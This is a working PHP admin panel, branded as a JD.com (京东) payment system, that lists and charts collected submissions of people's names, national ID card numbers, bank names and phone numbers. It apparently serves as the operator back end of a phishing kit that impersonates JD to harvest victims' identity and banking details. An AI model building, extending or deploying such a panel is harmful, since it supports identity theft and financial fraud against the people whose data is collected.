<?php
session_start();
require 'db.php';

if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: admin_login.php');
    exit;
}

// 处理密码修改
$error = $success = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_password'])) {
    $current_password = $_POST['current_password'];
    $new_password = $_POST['new_password'];
    $confirm_password = $_POST['confirm_password'];
    
    $stmt = $pdo->prepare("SELECT * FROM admin_users WHERE id = ?");
    $stmt->execute([$_SESSION['admin_id']]);
    $admin = $stmt->fetch();
    
    if (!password_verify($current_password, $admin['password'])) {
        $error = "原密码错误";
    } elseif ($new_password !== $confirm_password) {
        $error = "新密码不一致";
    } elseif (strlen($new_password) < 8) {
        $error = "密码至少需要8位";
    } else {
        $hashed_password = password_hash($new_password, PASSWORD_DEFAULT);
        $update_stmt = $pdo->prepare("UPDATE admin_users SET password = ? WHERE id = ?");
        $update_stmt->execute([$hashed_password, $_SESSION['admin_id']]);
        $success = "密码修改成功";
    }
}

// 获取当前页面参数
$current_page = $_GET['page'] ?? 'dashboard';

// 获取统计数据
$stats = $pdo->query("SELECT 
    COUNT(*) as total,
    DATE(created_at) as date 
    FROM submissions 
    GROUP BY DATE(created_at)
    ORDER BY date DESC 
    LIMIT 7")->fetchAll();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>管理后台 - 京东支付系统</title>
    <link href="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-color: #e4393c;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --success-color: #52c41a;
            --error-color: #ff4d4f;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft Yahei', sans-serif;
        }

        body {
            background: var(--secondary-color);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .dashboard-container {
            display: grid;
            grid-template-columns: 250px 1fr;
            min-height: 100vh;
        }

        .sidebar {
            background: #fff;
            padding: 20px;
            position: fixed;
            width: 250px;
            height: 100vh;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
            z-index: 1000;
        }

        .brand {
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }

        .nav-menu {
            list-style: none;
            margin-top: 30px;
        }

        .nav-item {
            margin: 10px 0;
        }

        .nav-link {
            display: block;
            padding: 12px;
            color: var(--text-color);
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s;
        }

        .nav-link:hover {
            background: var(--primary-color);
            color: white;
        }

        .nav-link.active {
            background: var(--primary-color);
            color: white !important;
        }

        .main-content {
            margin-left: 250px;
            width: calc(100vw - 250px);
            min-width: 800px;
            padding: 30px;
            overflow-x: auto;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .stat-title {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .stat-value {
            color: var(--primary-color);
            font-size: 2rem;
            font-weight: bold;
        }

        .data-table {
            width: 100%;
            min-width: 1000px;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-top: 20px;
        }

        .data-table th,
        .data-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
            min-width: 150px;
            max-width: 300px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .data-table th {
            background: var(--primary-color);
            color: white;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
        }

        @media (max-width: 768px) {
            .dashboard-container {
                grid-template-columns: 1fr;
            }

            .sidebar {
                position: static;
                width: 100%;
                height: auto;
            }

            .main-content {
                margin-left: 0;
                width: 100vw;
                min-width: 320px;
                padding: 15px;
            }

            .data-table {
                min-width: 600px;
            }

            .data-table th:nth-child(2),
            .data-table td:nth-child(2) {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="dashboard-container">
        <aside class="sidebar">
            <div class="brand">
                <img src="jd-logo.png" alt="京东" width="120">
            </div>
            <ul class="nav-menu">
                <li class="nav-item">
                    <a href="?page=dashboard" class="nav-link <?= $current_page === 'dashboard' ? 'active' : '' ?>">数据概览</a>
                </li>
                <li class="nav-item">
                    <a href="?page=records" class="nav-link <?= $current_page === 'records' ? 'active' : '' ?>">提交记录</a>
                </li>
                <li class="nav-item">
                    <a href="#" class="nav-link" onclick="showPasswordModal()">修改密码</a>
                </li>
                <li class="nav-item">
                    <a href="logout.php" class="nav-link">退出登录</a>
                </li>
            </ul>
        </aside>

        <main class="main-content">
            <?php if($current_page === 'records'): ?>
                <h1>全部提交记录</h1>
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>姓名</th>
                            <th>身份证号</th>
                            <th>银行</th>
                            <th>手机号</th>
                            <th>提交时间</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php 
                        $records = $pdo->query("SELECT * FROM submissions ORDER BY created_at DESC");
                        foreach ($records as $row): ?>
                        <tr>
                            <td><?= htmlspecialchars($row['name']) ?></td>
                            <td><?= htmlspecialchars($row['id_card']) ?></td>
                            <td><?= htmlspecialchars($row['bank_name']) ?></td>
                            <td><?= htmlspecialchars($row['phone']) ?></td>
                            <td><?= date('Y-m-d H:i', strtotime($row['created_at'])) ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <h1>数据概览</h1>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-title">总提交量</div>
                        <div class="stat-value"><?= $pdo->query("SELECT COUNT(*) FROM submissions")->fetchColumn() ?></div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">今日提交</div>
                        <div class="stat-value"><?= $pdo->query("SELECT COUNT(*) FROM submissions WHERE DATE(created_at) = CURDATE()")->fetchColumn() ?></div>
                    </div>
                </div>

                <canvas id="statsChart" style="max-width: 100%; height: 300px; margin: 20px 0;"></canvas>

                <h2>最近10条记录</h2>
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>姓名</th>
                            <th>银行</th>
                            <th>手机号</th>
                            <th>提交时间</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php 
                        $recent_records = $pdo->query("SELECT * FROM submissions ORDER BY created_at DESC LIMIT 10");
                        foreach ($recent_records as $row): ?>
                        <tr>
                            <td><?= htmlspecialchars($row['name']) ?></td>
                            <td><?= htmlspecialchars($row['bank_name']) ?></td>
                            <td><?= htmlspecialchars($row['phone']) ?></td>
                            <td><?= date('Y-m-d H:i', strtotime($row['created_at'])) ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </main>
    </div>

    <!-- 密码修改模态框 -->
    <div id="passwordModal" class="modal">
        <div class="modal-content">
            <h2>修改密码</h2>
            <?php if(isset($error)): ?>
                <div style="color:var(--error-color); margin:15px 0;"><?= $error ?></div>
            <?php endif; ?>
            <?php if(isset($success)): ?>
                <div style="color:var(--success-color); margin:15px 0;"><?= $success ?></div>
            <?php endif; ?>
            <form method="POST">
                <div style="margin-bottom:15px;">
                    <label>原密码</label>
                    <input type="password" name="current_password" required style="width:100%; padding:8px;">
                </div>
                <div style="margin-bottom:15px;">
                    <label>新密码</label>
                    <input type="password" name="new_password" required minlength="8" style="width:100%; padding:8px;">
                </div>
                <div style="margin-bottom:15px;">
                    <label>确认新密码</label>
                    <input type="password" name="confirm_password" required minlength="8" style="width:100%; padding:8px;">
                </div>
                <button type="submit" name="change_password" 
                    style="background:var(--primary-color); color:white; padding:10px 20px; border:none; border-radius:5px; cursor:pointer;">
                    确认修改
                </button>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.js"></script>
    <script>
        <?php if($current_page === 'dashboard'): ?>
        const ctx = document.getElementById('statsChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: <?= json_encode(array_column($stats, 'date')) ?>,
                datasets: [{
                    label: '每日提交量',
                    data: <?= json_encode(array_column($stats, 'total')) ?>,
                    borderColor: '#e4393c',
                    backgroundColor: 'rgba(228, 57, 60, 0.1)',
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                plugins: {
                    legend: {
                        position: 'top',
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            precision: 0
                        }
                    }
                }
            }
        });
        <?php endif; ?>

        function showPasswordModal() {
            document.getElementById('passwordModal').style.display = 'flex';
        }

        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>